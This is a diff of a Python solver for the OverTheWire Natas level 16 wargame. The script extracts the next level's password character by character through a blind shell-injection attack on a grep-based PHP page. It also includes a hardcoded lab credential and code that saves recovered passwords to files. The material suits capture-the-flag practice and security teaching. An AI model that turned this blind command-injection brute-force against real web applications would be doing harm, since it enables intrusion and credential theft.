@@ -23,7 +23,7 @@ def findpw(g):
     global pw
     if req(f'-E ^{pw+g}') != -1:
         pw +=g
-        print(pw)
+        #print(pw)
         return g
     else:
         return None
@@ -35,25 +35,31 @@ def main():
     for x in num:
         if x is not None:
             pw_len = x
-    print("The password is", pw_len, "characters in length.\n")
+    #print("The password is", pw_len, "characters in length.\n")
     with concurrent.futures.ThreadPoolExecutor(max_workers=pw_len) as executor:
         ch = executor.map(filterChars, alphanum)
     for x in ch:
         if x is not None:
             filt_chars.append(x)
-    print('The following characters appear in the password:', ''.join(filt_chars), '\n')
+    #print('The following characters appear in the password:', ''.join(filt_chars), '\n')
     for x in range(pw_len):
         with concurrent.futures.ThreadPoolExecutor(max_workers=len(filt_chars)) as executor:
             ch = executor.map(findpw, filt_chars)
 
-
-url = 'http://natas16.natas.labs.overthewire.org'
-lvl_pass = requests.auth.HTTPBasicAuth('natas16','TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')
+lvl = '16'
+next_level = str(int(lvl)+1)
+pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
+url = f'http://natas{lvl}.natas.labs.overthewire.org'
+lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)
 alphanum = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
 filt_chars = []
 pw_len = 0
 pw = ""
+
 main()
+
+open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)
+
 
 '''
 Shell injection PHP, folks, we love to see it.
